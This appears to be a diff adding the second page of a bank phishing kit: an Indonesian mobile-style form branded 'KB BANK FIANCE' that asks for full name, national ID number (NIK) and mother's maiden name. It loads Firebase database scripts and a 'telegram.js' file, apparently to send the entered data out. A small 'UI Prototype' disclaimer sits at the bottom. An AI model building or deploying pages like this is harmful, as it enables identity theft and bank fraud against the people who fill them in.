@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="description" content="Form identitas pemohon">
+  <title>KB BANK FIANCE — Identitas Pemohon</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <main class="app-phone">
+    <section class="mobile-hero">
+      <div class="statusbar">
+        <span>06.33</span>
+        <div class="status-icons"><span>▮▮▮</span><span>⌁</span><span class="battery">22</span></div>
+      </div>
+      <div class="hero-nav">
+        <button class="back-button" id="backButton" type="button" aria-label="Kembali">←</button>
+        <button class="language-button" type="button"><span>⌄ ID</span><span class="flag"></span></button>
+      </div>
+      <div class="hero-copy">
+        <div class="step"><span class="step-dot"></span>Langkah 2 dari 2</div>
+        <h1>Verifikasi Data Diri</h1>
+        <p>Lengkapi informasi identitas agar profil dashboard dapat ditampilkan secara otomatis.</p>
+      </div>
+    </section>
+
+    <section class="mobile-card">
+      <div class="card-title">
+        <h2>Informasi Identitas</h2>
+        <p>Pastikan data lengkap dan sesuai dengan kebutuhan proses verifikasi.</p>
+      </div>
+
+      <form id="identityForm" novalidate>
+        <div class="field">
+          <label for="fullName">Nama Lengkap</label>
+          <div class="input-wrap">
+            <input id="fullName" type="text" maxlength="80" autocomplete="name" placeholder="Masukkan nama lengkap">
+            <span class="field-icon">♙</span>
+          </div>
+          <small class="helper">Minimal 3 karakter dan hanya huruf, spasi, apostrof, atau titik.</small>
+        </div>
+
+        <div class="field">
+          <label for="nik">Nomor Induk Kependudukan (NIK)</label>
+          <div class="input-wrap">
+            <input id="nik" type="text" inputmode="numeric" maxlength="16" autocomplete="off" placeholder="16 digit NIK">
+            <span class="field-icon">▣</span>
+          </div>
+          <small class="helper">NIK harus terdiri dari tepat 16 angka.</small>
+        </div>
+
+        <div class="field">
+          <label for="motherName">Nama Ibu Kandung</label>
+          <div class="input-wrap">
+            <input id="motherName" type="text" maxlength="60" autocomplete="off" placeholder="Masukkan nama ibu kandung">
+            <span class="field-icon">♙</span>
+          </div>
+          <small class="helper">Minimal 3 karakter dan hanya huruf atau spasi.</small>
+        </div>
+
+        <div class="notice-box"><span>ⓘ</span><span>Data tersimpan pada browser untuk sinkronisasi antarmuka. Untuk produk nyata, pindahkan penyimpanan ke backend terenkripsi.</span></div>
+
+        <button id="continueButton" class="primary-mobile" type="submit" disabled>LANJUTKAN →</button>
+        <div id="message" class="message" role="status"></div>
+      </form>
+    </section>
+
+    <div class="progress-dots"><span></span><span class="active"></span></div>
+    <div class="footer-note">NIK akan ditampilkan dalam bentuk tersamarkan pada dashboard.</div>
+    <div class="home-indicator"></div>
+  </main>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="storage.js"></script>
+  <script src="telegram.js"></script>
+  <script src="form-nik.js"></script>
+<div style="padding:10px 16px;text-align:center;font-size:10px;line-height:1.5;color:#7c6f89;background:#f7f1fd;border-top:1px solid #eadcf8"><strong>UI Prototype</strong> — Alur, status, dan hasil pada halaman ini merupakan simulasi antarmuka.</div>
+</body>
+</html>
